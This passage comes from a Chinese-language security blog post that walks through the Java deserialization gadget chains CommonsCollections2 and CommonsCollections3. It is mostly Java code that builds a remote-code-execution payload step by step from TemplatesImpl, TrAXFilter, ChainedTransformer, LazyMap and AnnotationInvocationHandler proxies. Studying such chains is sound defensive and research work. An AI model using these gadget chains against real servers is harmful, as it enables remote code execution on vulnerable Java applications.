<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);<span class="comment">//不能像这样直接定义method名字</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128234002277.png" alt="image-20211128234002277"></p>
</li>
</ol>
<p>进入**queue.add()**后：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> offer(e);<span class="comment">//进入offer()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">        grow(i + <span class="number">1</span>);</span><br><span class="line">    size = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        queue[<span class="number">0</span>] = e;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUp(i, e);<span class="comment">//进入siftUp</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUp</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftUpUsingComparator(k, x);<span class="comment">//重点！</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUpComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)<span class="comment">//这里也会call compare，但是我们传过去的第二个元素并没有newTransformer方法，所以在生成payload的时候就会出错，所以我们需要把修改method放在queue.add()后面</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = e;</span><br><span class="line">        k = parent;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>为什么要add(new String(“n”))而不是add(1)?</strong></li>
</ol>
<p>通过跟踪服务端触发过程可以发现，<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129123207018.png" alt="image-20211129123207018">最先触发的总是队列中的第一个元素，如果第一个元素变成了1而不是<strong>templatesIml</strong>的话，我们就无法找到元素1当中的<strong>newTransformer</strong>方法，这时候会报错并抛出异常，无法执行到我们的恶意代码；但如果第一个元素是<strong>templatesIml</strong>的话，我们就可以执行到<strong>newTrasnformer</strong>方法。</p>
<p>同样，如果我们在payload中向queue中添加1而不是一个String类型，添加完毕后，queue会自动排序，将1排序到最前面，导致最后在server反序列化的时候会出错（如上方解释）。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/2.gif" alt="2"></p>
<p><strong>所以我们有两种方式来写这个payload，一种是我之前代码演示的那样。</strong></p>
<p><strong>第二种：也是ysoserial中使用的方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);<span class="comment">//先直接添加两个元素到queue里</span></span><br><span class="line"></span><br><span class="line">setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);<span class="comment">//修改方法名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后使用反射的方式，修改queue中的元素，这样就不会遇到在add的时候被自动排列的情况了</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[])getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">       <span class="keyword">return</span> field.get(obj);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>执行成功！</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129124841260.png" alt="image-20211129124841260"></p>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/232592">ysoserial CommonsCollections2 详细分析</a></p>
<p><a href="https://juejin.cn/post/6988477390276001829">JAVA双亲委派</a></p>
<p><a href="http://wjlshare.com/archives/1509">Java反序列化-CommonsCollections2分析</a></p>
<h2 id="Commons-Collections-3"><a href="#Commons-Collections-3" class="headerlink" title="Commons Collections 3"></a>Commons Collections 3</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>commons-collections:3.1</p>
</li>
<li><p>jdk7u21之前</p>
</li>
</ul>
<h3 id="复现演示-1"><a href="#复现演示-1" class="headerlink" title="复现演示"></a>复现演示</h3><p>依然是使用ysoserial生成，然后curl命令执行，和之前的cc1和cc2一样，此处就不演示了。</p>
<h3 id="Commons-Collections-3-利用链分析"><a href="#Commons-Collections-3-利用链分析" class="headerlink" title="Commons Collections 3 利用链分析"></a>Commons Collections 3 利用链分析</h3><h4 id="TemplatesImpl-amp-javassist"><a href="#TemplatesImpl-amp-javassist" class="headerlink" title="TemplatesImpl &amp; javassist"></a>TemplatesImpl &amp; javassist</h4><p>同cc2一样，我们需要用<code>javassist</code>生成带命令执行的<strong>字节码</strong>，然后用<code>TemplatesImpl</code>将其加载到JVM。</p>
<h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><p>在cc2中，InvokerTransformer的transform方法能够帮我们执行<code>TemplatesImpl</code>类的<code>newTransformer()</code>方法，而在cc3中，我们找到了另一个class - <strong>TrAXFilter</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();<span class="comment">//直接call到newTransformer方法</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现，TrAXFilter的构造器会直接call到<code>TransformerImpl</code>的<code>newTransformer()</code>方法，恰好<strong>TemplatesImpl</strong>和<strong>TransformerImpl</strong>都是继承<strong>Templates</strong>的。如果我们把<code>_templates</code>设置为我们自己构造的<code>TemplatesImpl instance</code>，命令就能被执行了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211130200257918.png" alt="image-20211130200257918"></p>
<p>因为我们的触发点是在<code>new TrAXFilter</code>的时候，<strong>所以我们需要在server反序列化我们的object的时候再执行这段代码，而不是我们自己在本地这样随便new一个就可以了。</strong></p>
<p>那么哪个类能够帮助我们new一个新的TrAXFilter呢？</p>
<h4 id="方法一：InvokerTransformer"><a href="#方法一：InvokerTransformer" class="headerlink" title="方法一：InvokerTransformer"></a>方法一：InvokerTransformer</h4><p><code>CommonsCollections 3.1</code>支持我们继续使用<code>InvokerTransformer</code></p>
<p>于是我们想到可以用<code>InvokerTransformer</code>来new一个新的<code>TrAXFilter</code>，下面我们先用反射的方式来写一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">trAXFilterClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>);<span class="comment">//获取Class</span></span><br><span class="line"><span class="comment">//Class trAXFilterClass = TrAXFilter.class//也可以直接这样，因为我们加载过该Class</span></span><br><span class="line">trAXFilterClass.getConstructor(TemplatesImpl.class).newInstance();<span class="comment">//获取constructor后再call newInstance</span></span><br></pre></td></tr></table></figure>

<p>我们尝试把上面的反射代码改写成InvokerTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;&#125;);<span class="comment">//先构造transformer的参数</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> i1.transform(TrAXFilter.class);<span class="comment">//call transform方法，返回一个constructor -&gt; constructor = TrAXFilter.class.getConstructor()</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;&#125;);</span><br><span class="line">i2.transform(constructor);<span class="comment">//constructor.newInstance()</span></span><br></pre></td></tr></table></figure>

<p>在这里我们可以直接构造<code>InvokerTransformer</code>，并在constructor传入方法参数 - 不像在cc2里，我们需要在<code>PriorityQueue.add()</code>之后修改 - 因为<code>PriorityQueue.add()</code>会在<strong>add</strong>的时候触发<code>comparator</code>从而<code>InvokerTransformer</code>的<code>transform()</code>方法，但在这里不会出现这种情况。</p>
<p>运行后成功弹出计算器。 </p>
<h4 id="方法二：InstantiateTransformer"><a href="#方法二：InstantiateTransformer" class="headerlink" title="方法二：InstantiateTransformer"></a>方法二：InstantiateTransformer</h4><p>除了使用<code>InvokerTransformer</code>来创建<code>TrAXFilter</code> instance，我们还可以通过一个新的Class <code>InstantiateTransformer</code>来完成。</p>
<p><code>InstantiateTransformer</code>的<code>transform()</code>方法中，有一处很明显的创建实例的代码。而它也是属于<code>Transformer</code>的实现类。使用该类，我们不再需要构造getConstructor这样的函数，因为他已经帮我做了，我们只需要传入<code>input</code>。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201110012791.png" alt="image-20211201110012791"></p>
<p>我们现在尝试使用InstantiateTransformer来写一段POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        InstantiateTransformer initiateTransformer= <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//传入参数类型是Templates Class，传入arguements为templates</span></span><br><span class="line">        initiateTransformer.transform(TrAXFilter.class);<span class="comment">//传入input为TrAxFilter.class</span></span><br></pre></td></tr></table></figure>

<p>计算器成功弹出！</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>我们在cc1中使用到了这个方法，它让我们可以将几条transformer串联起来，并用上一个<code>transfomer.transform(intput)</code>的返回值作为<strong>下一个</strong><code>transfomer.transform(input)</code>中的<strong>input</strong>进行执行。</p>
<p>这里我们再简单的复习一遍</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;<span class="comment">//我们可以构造transformers</span></span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;<span class="comment">//依次循环每个transformer,当前transformer.transform(object)的返回值会直接变成下一个transformer.trnasform(object)中的object</span></span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是，我们还差一个开头的transformer。 <code>TrAXFilter.getConstructor.newInstance()</code>中的<code>TrAXFilter</code>类，我们需要想办法让他也能用<code>ChainedTransformer</code>连接起来，而不是手动去用<code>.transform(input)</code>作为<code>input</code>传入进去。</p>
<p><strong>方法一：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="comment">/* 这里需要添加一个transformer，让他能够返回TrAXFilter class，作为下一个transformer的input */</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="comment">/* 这里需要添加一个transformer，让他能够返回TrAXFilter class，作为下一个transformer的input */</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>我们最终选择使用我们在cc1中用到的<code>ConstantTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个类，我们可以将<code>TrAXFilter</code>类传进去，作为<code>transformers</code>的开头，这样我们的链就串上了！</p>
<p><strong>方法一：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(trAXFilterClass),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;1&quot;</span>);<span class="comment">//触发第一条ConstantTransformer，传入参数随便写，不影响，因为ConstantTrnasformer的transform函数不会用到它自己的input参数</span></span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;1&quot;</span>);<span class="comment">//触发第一条ConstantTransformer，传入参数随便写，不影响，因为ConstantTrnasformer的transform函数不会用到它自己的input参数</span></span><br></pre></td></tr></table></figure>

<p>计算器执行成功。</p>
<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><span id="lazyMap">ps：CC1的LazyMap及之后的部分也和这个一样。</span></p>
<p>接下来我们需要寻找触发<code>ChainedTrasnformer.transform()</code>的方法。在CC1链中，我们用到了<code>LazyMap.get()</code>，其中invoke了<code>transform()</code>方法。当我们把<code>factory</code>赋值为<code>chainedTransformer</code>就可以触发其<code>transform()</code>方法了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但因为<code>LazyMap</code>的constructor是protected的，所以我们不能直接构造，我们发现LazyMap的decorate()方法可以返回一个instance：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map,chainedTransformer);<span class="comment">//得到lazyMap instance</span></span><br></pre></td></tr></table></figure>

<p>那么怎样触发LazyMap.get()方法呢？最好是readObject内部可以用到的。</p>
<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>我们发现在<code>AnnotationInvocationHandler</code>中的<code>invoke()</code>调用了<code>memberValues.get(member)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;hashCode&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;annotationType&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);<span class="comment">//这里调用了get()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们把memberValues的值改为Lazymap对象，那么我们就可以触发漏洞了。</p>
<p>我们可以通过AnnotationInvocationHandler的构造函数来达到这个目的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但尝试后发现并不能直接创建对象</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/image-20211201153006916.png" alt="image-20211201153006916"> </p>
<p>因为AnnotationInvocationHandler无法直接访问，于是我们使用反射方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"><span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">secondInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);<span class="comment">//AnnotationInvocationHandler是实现InvocationHandler类的，我们可以直接把他转化为InvocationHandler类，传入我们的lazyMap</span></span><br></pre></td></tr></table></figure>

<p>但我们应该如何call到<code>secondInvocationHandler</code>的<code>invoke()</code>方法呢?</p>
<h4 id="动态代理-InvocationHandler-amp-AnnotationInvocationHandler"><a href="#动态代理-InvocationHandler-amp-AnnotationInvocationHandler" class="headerlink" title="动态代理 - InvocationHandler &amp; AnnotationInvocationHandler"></a>动态代理 - InvocationHandler &amp; AnnotationInvocationHandler</h4><p><a href="https://leihehehe.github.io/2021/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/">Java反序列化漏洞之静态代理与动态代理(5)</a>中已经详细讲解过，此处的<code>InvocationHandler</code>接口其实就是负责提供调用代理操作，在动态代理中，一个代理类必须要实现<code>InvocationHandler</code>类，从而每当客户调用代理类动态生成的代理instance的方法的时候，<strong>都会被转发</strong>至代理类的<code>invoke()</code>方法。我们得知<code>AnnotationInvocationHandler implements InvocationHandler</code>，是否意味着，<code>AnnotationInvocationHandler</code>就可以作为一个代理类呢？</p>
<p>如果我们用<code>AnnotationInvocationHandler</code>代理类动态生成一个代理A，再去访问代理A的方法，我们就可以自动call到代理类<code>AnnotationInvocationHandlers</code>中的<code>invoke()</code>方法了</p>
<p>如果这个代理A是一个HashMap，那么我们只要执行了这个创建的代理HashMap的任意一个function，都能触发命令。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建代理类的实例</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">InvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);</span><br><span class="line"><span class="comment">//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);</span><br></pre></td></tr></table></figure>

<h4 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h4><p>我们注意到<code>AnnotationInvocationHandler</code>有它自己的<code>readObject()</code>，这意味着，如果我们把它作为序列化object传给服务器，服务器在反序列化时会执行其<code>readObject()</code>方法。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201161957159.png" alt="image-20211201161957159"></p>
<p>经过分析，我们非常清楚，<code>memberValues</code>是可控的，可以通过反射构造函数来控制。如果我们将<code>memberValues</code>设置为我们上一步生成的代理<code>evilMap</code>，那么意味着，反序列化时我们就可以完成整条攻击链了！</p>
